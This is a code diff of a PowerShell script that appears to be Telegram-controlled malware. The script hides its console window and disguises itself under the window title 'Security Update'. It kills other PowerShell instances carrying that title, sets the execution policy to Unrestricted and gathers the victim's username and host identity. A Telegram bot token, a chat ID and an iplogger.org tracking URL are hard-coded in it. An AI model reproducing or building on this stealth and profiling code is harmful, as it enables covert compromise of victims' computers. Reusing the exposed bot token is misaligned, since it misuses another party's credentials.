@@ -4,17 +4,20 @@ public static extern IntPtr GetConsoleWindow();
 [DllImport("user32.dll")]
 public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);'
 
-#Hide-Console
-KillProc
+Hide-Console
+#KillProc
 
 $BotToken = "1703588475:AAEyrNt2cuj-u6hWO8t3_NIbKLFVQyMDwNE"
 $ChatID = '928905258'
 $PersistPath = 'https://iplogger.org/2jaZG6'
 
 function KillProc {
-  $Title = "System Information"
-  $host.UI.RawUI.WindowTitle = $Title
-  (Get-WmiObject Win32_Process -Filter "name = 'powershell'" | where {$_.WindowTitle -like '*Security Update*'}).Terminate()
+  $host.UI.RawUI.WindowTitle = "System Information"
+
+  (Get-WmiObject Win32_Process -Filter "name = 'powershell'" | where {$_.MainWindowTitle -like '*Security Update*'}).Terminate()
+  
+  Start-Sleep -Seconds 15
+  $host.UI.RawUI.WindowTitle = "Security Update"
 }
 
 function Hide-Console {     
@@ -187,7 +190,6 @@ Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
   [Net.SecurityProtocolType]::Tls11 -bor `
   [Net.SecurityProtocolType]::Tls
 
-$host.UI.RawUI.WindowTitle = "Security Update"
 $username = $env:UserName
 $hostname = Invoke-Expression whoami
 $pwd = pwd
